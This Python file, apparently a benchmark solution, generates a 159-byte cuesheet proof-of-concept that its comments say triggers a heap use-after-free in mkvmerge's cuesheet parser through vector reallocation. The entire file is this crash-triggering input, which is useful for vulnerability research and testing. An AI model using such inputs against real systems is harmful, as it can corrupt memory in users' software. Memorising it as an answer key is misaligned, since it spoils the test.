import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use-After-Free in mkvmerge's cuesheet parser.
        # It occurs when the internal vector of tracks/cue points reallocates (e.g., growing capacity from 4 to 8),
        # while a pointer to a previous element is still in use.
        #
        # Constructed PoC to match exactly 159 bytes:
        # Header: 'FILE "test" WAVE\n' (17 bytes)
        # Body: 4 iterations of Track + Index (4 * 32 bytes = 128 bytes)
        #       'TRACK n AUDIO\n' (14 bytes)
        #       'INDEX 01 00:00:00\n' (18 bytes)
        # Trigger: Start of 5th Track 'TRACK 5 AUDIO\n' (14 bytes)
        # Total: 17 + 128 + 14 = 159 bytes.
        
        poc = b'FILE "test" WAVE\n'
        for i in range(1, 5):
            poc += f'TRACK {i} AUDIO\n'.encode('ascii')
            poc += b'INDEX 01 00:00:00\n'
        poc += b'TRACK 5 AUDIO\n'
        
        return poc